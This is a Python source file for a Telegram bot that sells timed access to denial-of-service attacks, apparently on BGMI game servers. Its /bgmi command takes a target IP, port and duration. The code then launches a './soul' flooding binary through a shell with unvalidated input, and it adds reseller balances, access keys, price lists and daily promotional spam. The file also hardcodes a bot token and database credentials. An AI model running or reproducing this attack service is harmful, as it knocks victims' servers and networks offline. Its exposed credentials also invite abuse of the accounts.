from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from datetime import datetime, timedelta
import subprocess
import time  # Import time for sleep functionalit
import asyncio
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from pymongo import MongoClient
import random 
import string

# Bot token
BOT_TOKEN = '7718352742:AAGUjv_NDp4sgnTnFQ62BPBgcb49wdKLrjY'  # Replace with your bot token

# Admin ID
ADMIN_ID = 1944182800

# Admin information
ADMIN_USERNAME = "❄️Daku Bhaiz❄️"
ADMIN_CONTACT = "@DAKUBhaiZz"

# MongoDB Connection
MONGO_URL = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
client = MongoClient(MONGO_URL)

# Database and Collection
db = client["dake"]  # Database name
collection = db["Users"]  # Collection name
key_collection = db["Keys"]  # Collection for storing keys

# Dictionary to track recent attacks with a cooldown period
recent_attacks = {}

# Cooldown period in seconds
COOLDOWN_PERIOD = 180

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin = collection.find_one({"user_id": update.effective_user.id})
    
    # Check if the user is the Super Admin or a normal admin
    if update.effective_user.id != ADMIN_ID and (not admin or not admin.get("is_admin", False)):
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])  # ID of the user to approve
        duration = context.args[1]  # Duration with a unit (e.g., 1m, 2h, 3d)

        # Parse the duration
        duration_value = int(duration[:-1])  # Numeric part
        duration_unit = duration[-1].lower()  # Unit part (m = minutes, h = hours, d = days)

        # Calculate expiration time
        if duration_unit == "m":  # Minutes
            expiration_date = datetime.now() + timedelta(minutes=duration_value)
        elif duration_unit == "h":  # Hours
            expiration_date = datetime.now() + timedelta(hours=duration_value)
        elif duration_unit == "d":  # Days
            expiration_date = datetime.now() + timedelta(days=duration_value)
        else:
            await update.message.reply_text(
                "❌ *Invalid duration format. Use `m` for minutes, `h` for hours, or `d` for days.*",
                parse_mode="Markdown"
            )
            return

        # Super Admin logic: No balance deduction
        if update.effective_user.id == ADMIN_ID:
            collection.update_one(
                {"user_id": user_id},
                {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
                upsert=True
            )
            await update.message.reply_text(
                f"✅ *User {user_id} approved by Super Admin for {duration_value} "
                f"{'minute' if duration_unit == 'm' else 'hour' if duration_unit == 'h' else 'day'}(s).* \n"
                f"⏳ *Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode="Markdown"
            )

            # Notify approved user
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=(
                        f"🎉 *Congratulations!*\n"
                        f"✅ You have been approved for {duration_value} "
                        f"{'minute(s)' if duration_unit == 'm' else 'hour(s)' if duration_unit == 'h' else 'day(s)'}.\n"
                        f"⏳ *Your access will expire on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}.\n"
                        f"🚀 Enjoy using the bot!"
                    ),
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"Error notifying approved user {user_id}: {e}")
            return

        # Balance deduction for normal admins
        pricing = {
            1: 75,  # 1 day = ₹75
            3: 195,  # 3 days = ₹195
            7: 395,  # 7 days = ₹395
            30: 715  # 30 days = ₹715
        }
        price = pricing.get(duration_value) if duration_unit == "d" else None  # Pricing only applies for days

        if price is None:
            await update.message.reply_text(
                "❌ *Normal admins can only approve for fixed durations: 1, 3, 7, 30 days.*",
                parse_mode="Markdown"
            )
            return

        admin_balance = admin.get("balance", 0)
        if admin_balance < price:
            await update.message.reply_text("❌ *Insufficient balance to approve this user.*", parse_mode="Markdown")
            return

        # Deduct balance for normal admin
        collection.update_one(
            {"user_id": update.effective_user.id},
            {"$inc": {"balance": -price}}
        )

        # Approve the user
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
            upsert=True
        )

        await update.message.reply_text(
            f"✅ *User {user_id} approved for {duration_value} days by Admin.*\n"
            f"💳 *₹{price} deducted from your balance.*\n"
            f"⏳ *Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="Markdown"
        )

        # Notify approved user
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=(
                    f"🎉 *Congratulations!*\n"
                    f"✅ You have been approved for {duration_value} days.\n"
                    f"⏳ *Your access will expire on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}.\n"
                    f"🚀 Enjoy using the bot!"
                ),
                parse_mode="Markdown"
            )
        except Exception as e:
            print(f"Error notifying approved user {user_id}: {e}")

    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /approve <user_id> <duration>*\n\n"
            "Example durations:\n\n"
            "1 Days = ₹75\n"
            "3 Days = ₹195\n"
            "7 Days = ₹395\n"
            "30 Days = ₹715\n",
            parse_mode="Markdown"
        )

from datetime import datetime, timedelta

async def notify_expiring_users(bot):
    while True:
        try:
            now = datetime.now()
            # Find users whose expiration is exactly 10 seconds from now
            expiring_soon_users = collection.find({
                "expiration_date": {"$gte": now, "$lte": now + timedelta(seconds=10)}
            })

            for user in expiring_soon_users:
                user_id = user.get("user_id")
                expiration_date = user.get("expiration_date")

                print(f"Notifying user {user_id} about expiration at {expiration_date}")  # Debug log

                try:
                    # Notify the user about their upcoming expiration
                    await bot.send_message(
                        chat_id=user_id,
                        text=(
                            "⚠️ *Your access is about to expire in 10 seconds!*\n"
                            "🔑 Please renew your access to continue using the bot."
                        ),
                        parse_mode="Markdown"
                    )
                    print(f"Notification sent to user {user_id}")  # Log success
                except Exception as e:
                    print(f"Error notifying user {user_id}: {e}")  # Log errors

        except Exception as main_error:
            print(f"Error in notify_expiring_users: {main_error}")

        await asyncio.sleep(5)  # Check every 5 seconds
        
# Remove a user from MongoDB
async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode='Markdown')
        return

    try:
        user_id = int(context.args[0])

        # Remove user from MongoDB
        result = collection.delete_one({"user_id": user_id})

        if result.deleted_count > 0:
            await update.message.reply_text(f"❌ *User {user_id} has been removed from the approved list.*", parse_mode='Markdown')
        else:
            await update.message.reply_text("🚫 *User not found in the approved list.*", parse_mode='Markdown')
    except IndexError:
        await update.message.reply_text("❌ *Usage: /remove <user_id>*", parse_mode='Markdown')

# Notifications List
notifications = [
    "🎉 *Exclusive Offer! Limited Time Only!*\n\n💫 *Daku Bhaiz ka bot ab working hai!* \n🔥 Get it now and enjoy premium features at the best price.\n\n📩 Contact @DAKUBhaiZz to purchase the bot today!",
    "🚀 *100% Working Bot Available Now!*\n\n✨ Ab gaming aur tools ka maza lo bina kisi rukawat ke! \n💵 Affordable prices aur limited-time offers!\n\n👻 *Contact the owner now:* @DAKUBhaiZz",
    "🔥 *Grab the Deal Now!* 🔥\n\n💎 Daku Bhaiz ke bot ka fayda uthaiye! \n✅ Full support, trusted service, aur unbeatable offers!\n\n👉 Message karo abhi: @DAKUBhaiZz",
    "🎁 *Offer Alert!*\n\n🚀 Bot by Daku Bhaiz is now live and ready for purchase! \n💸 Limited-period deal hai, toh der na karein.\n\n📬 DM karo abhi: @DAKUBhaiZz",
    "🌟 *Trusted Bot by Daku Bhaiz* 🌟\n\n🎯 Working, trusted, aur power-packed bot ab available hai! \n✨ Features ka maza lo aur apna kaam easy banao.\n\n📞 DM for details: @DAKUBhaiZz",
]

# Function to check if a user is approved
def is_user_approved(user_id):
    user = collection.find_one({"user_id": user_id})
    if user:
        expiration_date = user.get("expiration_date")
        if expiration_date and datetime.now() < expiration_date:
            return True
    return False

# Notify unapproved users daily
async def notify_unapproved_users(bot):
    while True:
        try:
            # Fetch all users from the database
            all_users = collection.find()

            for user in all_users:
                user_id = user.get("user_id")
                if not is_user_approved(user_id):  # Only notify unapproved users
                    notification = random.choice(notifications)  # Select a random notification
                    try:
                        await bot.send_message(
                            chat_id=user_id,
                            text=notification,
                            parse_mode="Markdown"
                        )
                        print(f"Notification sent to unapproved user {user_id}")
                    except Exception as e:
                        print(f"Error sending notification to user {user_id}: {e}")

            # Wait for 24 hours before sending the next notification
            await asyncio.sleep(24 * 60 * 60)

        except Exception as e:
            print(f"Error in notify_unapproved_users: {e}")
            await asyncio.sleep(60)  # Retry after 1 minute if there is an error

# Function to add spaced buttons to messages
def get_default_buttons():
    keyboard = [
        [InlineKeyboardButton("💖 JOIN OUR CHANNEL 💖", url="https://t.me/DAKUBHAIZ")],
        [InlineKeyboardButton("👻 CONTACT OWNER 👻", url="https://t.me/DAKUBhaiZz")]
    ]
    return InlineKeyboardMarkup(keyboard)
    
async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        balance = int(context.args[1])

        # Add admin privileges and balance
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"is_admin": True, "balance": balance}},
            upsert=True
        )

        await update.message.reply_text(
            f"✅ *User {user_id} is now an admin with ₹{balance} balance.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /addadmin <user_id> <balance>*",
            parse_mode="Markdown"
        )
        
async def addbalance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])

        # Add balance to the admin's account
        collection.update_one(
            {"user_id": user_id},
            {"$inc": {"balance": amount}}
        )

        await update.message.reply_text(
            f"✅ *₹{amount} added to Admin {user_id}'s balance.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /addbalance <user_id> <amount>*",
            parse_mode="Markdown"
        )
        
async def adminbalance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin = collection.find_one({"user_id": update.effective_user.id})
    if not admin or not admin.get("is_admin", False):
        await update.message.reply_text("🚫 *You are not an admin.*", parse_mode="Markdown")
        return

    balance = admin.get("balance", 0)
    await update.message.reply_text(f"💳 *Admin current balance is ₹{balance}.*", parse_mode="Markdown")

# Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_message = (
        f"👋 *Hello, {user.first_name}!*\n\n"
        "✨ *Welcome to the bot.*\n"
        "📜 *Type /help to see available commands.*\n\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    )
    await update.message.reply_text(welcome_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_data = collection.find_one({"user_id": user.id})
    if user.id == ADMIN_ID:
        help_message = (
            "📜 *Super Admin Commands:*\n\n"
            "/approve - Approve users\n"
            "/addadmin - Add a reseller\n"
            "/addbalance - Add balance to an admin\n"
            "/remove - Remove a user\n"
            "/genkey - Generate keys\n"
            "/redeem - Redeem keys\n"
            "/adminbalance - Check balance\n"
            "/bgmi - Start attack\n"
            "/settime - Set attack time limit\n"
            "/setthread - Change thread settings\n"
            "/price - View prices\n"
            "/rule - View rules\n"
            "/owner - Contact owner\n"
            "/myinfo - View your info\n"
            "/removecoin - Remove coin\n"
            "/removeadmin - Remove admin\n"
        )
    elif user_data and user_data.get("is_admin"):
        help_message = (
            "📜 *Admin Commands:*\n\n"
            "/genkey - Generate keys\n"
            "/redeem - Redeem keys\n"
            "/bgmi - Start attack\n"
            "/adminbalance - Check your balance\n"
            "/help - View commands\n"
        )
    else:
        help_message = (
            "📜 *User Commands:*\n\n"
            "/bgmi - Start attack\n"
            "/price - View prices\n"
            "/rule - View rules\n"
            "/owner - Contact owner\n"
            "/myinfo - View your info\n"
            "/redeem - Redeem key\n"
            "/howtoattack - How To Attack\n"
            "/canary - Download Canary Android & Ios\n"
        )

    await update.message.reply_text(help_message, parse_mode="Markdown")
    
async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    admin_data = collection.find_one({"user_id": user_id})
    
    # Super Admin direct access
    if user_id == ADMIN_ID:
        is_super_admin = True
    else:
        is_super_admin = False

    # Normal Admin check
    if not is_super_admin and (not admin_data or not admin_data.get("is_admin")):
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        # Super Admin allows minutes/hours/days
        duration_input = context.args[0]  # e.g., "30m", "2h", "7d"
        duration_value = int(duration_input[:-1])  # Extract numeric part
        duration_unit = duration_input[-1].lower()  # Extract unit ('m', 'h', 'd')

        if not is_super_admin and duration_unit != "d":  # Normal Admin restriction
            await update.message.reply_text(
                "❌ *Normal admins can only generate keys for fixed days: 1, 3, 7, 30.*",
                parse_mode="Markdown"
            )
            return

        # Calculate duration in seconds
        if duration_unit == "m":  # Minutes
            duration_seconds = duration_value * 60
        elif duration_unit == "h":  # Hours
            duration_seconds = duration_value * 3600
        elif duration_unit == "d":  # Days
            duration_seconds = duration_value * 86400
        else:
            await update.message.reply_text("❌ *Invalid duration format. Use `m`, `h`, or `d`.*", parse_mode="Markdown")
            return

        # Pricing logic for Normal Admin
        pricing = {1: 75, 3: 195, 7: 395, 30: 715}  # Days-based pricing
        price = pricing.get(duration_value) if duration_unit == "d" else None

        if not is_super_admin:  # Normal Admin pricing logic
            if price is None:
                await update.message.reply_text(
                    "❌ *Invalid duration. Choose from: 1, 3, 7, 30 days.*",
                    parse_mode="Markdown"
                )
                return

            balance = admin_data.get("balance", 0)
            if balance < price:
                await update.message.reply_text(
                    f"❌ *Insufficient balance!*\n💳 Current Balance: ₹{balance}\n💰 Required: ₹{price}",
                    parse_mode="Markdown"
                )
                return
            # Deduct balance
            collection.update_one({"user_id": user_id}, {"$inc": {"balance": -price}})
        
        # Generate random key
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

        # Save key to database
        key_collection.insert_one({
            "key": key,
            "duration_seconds": duration_seconds,
            "generated_by": user_id,
            "is_redeemed": False
        })

        await update.message.reply_text(
            f"✅ *Key Generated Successfully!*\n🔑 Key: `{key}`\n⏳ Validity: {duration_value} {'minute(s)' if duration_unit == 'm' else 'hour(s)' if duration_unit == 'h' else 'day(s)'}\n💳 Cost: ₹{price if not is_super_admin else 'Free'}",
            parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /gen <duration>*\n\n"
            "📑Examples:\n"
            "1 Day = ₹75\n3 Days = ₹195\n7 Days = ₹395\n30 Days = ₹715\n\n"
            "/𝙜𝙚𝙣 1𝙙 <-- 𝘼𝙖𝙞𝙨𝙚 𝘿𝙖𝙡𝙤 𝙆𝙚𝙮 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚 𝙆𝙖𝙧𝙣𝙚 𝙆𝙚 𝙇𝙞𝙮𝙚",
            parse_mode="Markdown"
        )
        
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        key = context.args[0]  # Key to redeem
        key_data = key_collection.find_one({"key": key, "is_redeemed": False})

        if not key_data:
            await update.message.reply_text("❌ *Invalid or already redeemed key.*", parse_mode="Markdown")
            return

        # Calculate expiration date
        duration_seconds = key_data["duration_seconds"]
        expiration_date = datetime.now() + timedelta(seconds=duration_seconds)

        # Update user expiration date
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
            upsert=True
        )

        # Mark key as redeemed
        key_collection.update_one({"key": key}, {"$set": {"is_redeemed": True}})

        await update.message.reply_text(
            f"✅ *Key Redeemed Successfully!*\n🔑 Key: `{key}`\n⏳ Access Expires: {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="Markdown"
        )
    except IndexError:
        await update.message.reply_text(
            "❌ *Usage: /redeem <key>*",
            parse_mode="Markdown"
        )
        
async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])

        # Remove admin privileges
        collection.update_one(
            {"user_id": user_id},
            {"$unset": {"is_admin": "", "balance": ""}}
        )

        await update.message.reply_text(
            f"✅ *User {user_id} is no longer an admin.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /removeadmin <user_id>*",
            parse_mode="Markdown"
        )
        
async def removecoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])

        # Deduct balance
        admin_data = collection.find_one({"user_id": user_id})
        if not admin_data or not admin_data.get("is_admin", False):
            await update.message.reply_text(
                "❌ *The specified user is not an admin.*", parse_mode="Markdown"
            )
            return

        current_balance = admin_data.get("balance", 0)
        if current_balance < amount:
            await update.message.reply_text(
                "❌ *Insufficient balance to deduct.*", parse_mode="Markdown"
            )
            return

        collection.update_one(
            {"user_id": user_id},
            {"$inc": {"balance": -amount}}
        )

        await update.message.reply_text(
            f"✅ *₹{amount} deducted from Admin {user_id}'s balance.*",
            parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /removecoin <user_id> <amount>*",
            parse_mode="Markdown"
        )

# Global variables to track current attack
current_attack_user = None  # Tracks the current user attacking
current_attack_end_time = None  # Tracks when the current attack will end

# Global variable for attack time limit (default: 240 seconds)
attack_time_limit = 240

# Command to set the attack limit dynamically
async def set_attack_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        new_limit = int(context.args[0])  # New attack limit in seconds
        if new_limit < 1:
            await update.message.reply_text("⚠️ *Invalid limit. Please enter a value greater than 0.*", parse_mode="Markdown")
            return
        global attack_time_limit
        attack_time_limit = new_limit  # Update global attack time limit
        await update.message.reply_text(f"✅ *Attack time limit has been updated to {new_limit} seconds.*", parse_mode="Markdown")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ *Usage: /setattacklimit <duration_in_seconds>*", parse_mode="Markdown")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack_user, current_attack_end_time, attack_time_limit

    user_id = update.effective_user.id
    user_name = update.effective_user.first_name

    # Check if user is approved
    if not is_user_approved(user_id):
        await update.message.reply_text(
            "🚫 *You are not authorized to use this command.*\n"
            "💬 *Please contact the admin if you believe this is an error.*",
            parse_mode="Markdown",
        )
        return

    # Validate arguments (IP, Port, Duration)
    if len(context.args) != 3:
        await update.message.reply_text(
            f"✅ *Usage:* /bgmi <ip> <port> <duration>",
            parse_mode="Markdown",
        )
        return

    ip = context.args[0]
    port = context.args[1]
    try:
        time_duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text(
            "⚠️ *Invalid duration. Please enter a valid number.*",
            parse_mode="Markdown",
        )
        return

    # Check if the port is invalid (20001, 20002, 17500, 20000, or three-digit)
    if port in ["20001", "20002", "17500", "20000"] or len(port) == 3:
        await update.message.reply_text(
            f"🚫 *Port {port} is not allowed.*\n"
            "📖 *Learn more about valid ports here:*\n"
            f"[Click to Watch](https://youtu.be/gcc-iovADq4?si=teEuoQLRGNQK6MxZ)",
            parse_mode="Markdown",
        )
        return

    # Check if duration exceeds the attack time limit
    if time_duration > attack_time_limit:
        await update.message.reply_text(
            f"⚠️ *You cannot attack for more than {attack_time_limit} seconds.*",
            parse_mode="Markdown",
        )
        return

    # Check if another attack is in progress
    if current_attack_user is not None:
        remaining_time = (current_attack_end_time - datetime.now()).total_seconds()
        if remaining_time > 0:
            await update.message.reply_text(
                f"⚠️ *Another user (ID: {current_attack_user}) is already attacking. Please wait {int(remaining_time)} seconds.*",
                parse_mode="Markdown",
            )
            return
        else:
            # If time has passed, reset the global variables
            current_attack_user = None
            current_attack_end_time = None

    # Set current user as the attacking user
    current_attack_user = user_id
    current_attack_end_time = datetime.now() + timedelta(seconds=time_duration)

    # Send attack started message
    await update.message.reply_text(
        f"🚀 *ATTACK STARTED*\n"
        f"🌐 *IP:* {ip}\n"
        f"🎯 *PORT:* {port}\n"
        f"⏳ *DURATION:* {time_duration} seconds\n"
        f"👤 *User:* {user_name} (ID: {user_id})\n\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz.",
        parse_mode="Markdown",
    )

    # Start the attack process
    asyncio.create_task(run_attack(ip, port, time_duration, update, user_id))
    
# Default thread value
default_thread = "900"

# Command to set thread dynamically
async def set_thread(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        global default_thread
        new_thread = context.args[0]
        if not new_thread.isdigit():
            await update.message.reply_text("❌ *Invalid thread value. Please provide a numeric value.*", parse_mode="Markdown")
            return

        default_thread = new_thread  # Update the default thread value
        await update.message.reply_text(f"✅ *Thread value updated to {default_thread}.*", parse_mode="Markdown")
    except IndexError:
        await update.message.reply_text("❌ *Usage: /setthread <thread_value>*", parse_mode="Markdown")

# Modify the attack command to use the dynamic thread value
async def run_attack(ip, port, time_duration, update, user_id):
    global current_attack_user, current_attack_end_time, default_thread

    try:
        # Simulate the attack command with dynamic thread
        command = f"./soul {ip} {port} {time_duration} {1024} {default_thread}"
        process = subprocess.Popen(command, shell=True)

        # Wait for the specified duration
        await asyncio.sleep(time_duration)

        # Terminate the process after the duration
        process.terminate()

        # Send attack finished message
        await update.message.reply_text(
            f"✅ *ATTACK FINISHED*\n"
            f"🌐 *IP:* {ip}\n"
            f"🎯 *PORT:* {port}\n"
            f"⏳ *DURATION:* {time_duration} seconds\n"
            f"💻 *Thread Used:* {default_thread}\n"
            f"👤 *User ID:* {user_id}\n\n"
            "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz.",
            parse_mode="Markdown",
        )

    except Exception as e:
        # Handle errors during the attack
        await update.message.reply_text(
            f"⚠️ *Error occurred during the attack:* {str(e)}",
            parse_mode="Markdown",
        )
    finally:
        # Reset global variables to allow the next attack
        if current_attack_user == user_id:
            current_attack_user = None
            current_attack_end_time = None

# Command for /howtoattack
async def howtoattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Learn How to Attack:*\n"
        f"[Watch the Tutorial](https://youtu.be/gcc-iovADq4?si=teEuoQLRGNQK6MxZ)",
        parse_mode="Markdown"
    )

# Command for /canary
async def canary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📱Android Canary📱", url="https://t.me/DAKUBHAIZ/143")],
        [InlineKeyboardButton("🍎iOS Canary🍎", url="https://apps.apple.com/in/app/surge-5/id1442620678")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🛠️ *Choose your platform to download the Canary version:*",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
            
async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    price_message = (
        "💰 *PRICE LIST:*\n\n"
        "⭐ 1 Day = ₹115\n"
        "⭐ 3 Days = ₹295\n"
        "⭐ 1 Week = ₹525\n"
        "⭐ 1 Month = ₹995\n"
        "⭐ Lifetime = ₹1,585\n\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    )
    await update.message.reply_text(price_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def rule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rule_message = "⚠️ *Rule: Ek Time Pe Ek Hi Attack Lagana*\n\n💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    await update.message.reply_text(rule_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"👤 *The owner of this bot is {ADMIN_USERNAME}.*\n"
        f"✉️ *Contact:* {ADMIN_CONTACT}\n\n", parse_mode='Markdown'
    )

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    info_message = (
        "📝 *Your Information:*\n"
        f"🔗 *Username:* @{user.username}\n"
        f"🆔 *User ID:* {user.id}\n"
        f"👤 *First Name:* {user.first_name}\n"
        f"👥 *Last Name:* {user.last_name if user.last_name else 'N/A'}\n\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    )
    await update.message.reply_text(info_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def admincommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await not_authorized_message(update)
        return

    admin_message = (
        "🔧 *Admin-only commands:*\n"
        "/approve - Add user\n"
        "/remove - Remove user\n"
        "/settime - Set Attack Time\n"
        "/setthread - Thread Changing\n"
        "/addbalance - Add Admin Balance\n"
        "/addadmin - Add Reseller\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    )
    await update.message.reply_text(admin_message, parse_mode='Markdown')

async def start_background_tasks(app):
    asyncio.create_task(notify_expiring_users(app.bot))  # Existing notification task
    asyncio.create_task(notify_unapproved_users(app.bot))  # Naya task unapproved users ke liye

def main():
    application = ApplicationBuilder().token(BOT_TOKEN).post_init(start_background_tasks).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("price", price))
    application.add_handler(CommandHandler("rule", rule))
    application.add_handler(CommandHandler("owner", owner))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("admincommand", admincommand))
    application.add_handler(CommandHandler("settime", set_attack_limit))
    application.add_handler(CommandHandler("setthread", set_thread))
    application.add_handler(CommandHandler("addadmin", addadmin))
    application.add_handler(CommandHandler("addbalance", addbalance))
    application.add_handler(CommandHandler("adminbalance", adminbalance))
    application.add_handler(CommandHandler("genkey", gen))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("removeadmin", removeadmin))
    application.add_handler(CommandHandler("removecoin", removecoin))
    application.add_handler(CommandHandler("howtoattack", howtoattack))
    application.add_handler(CommandHandler("canary", canary))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
    
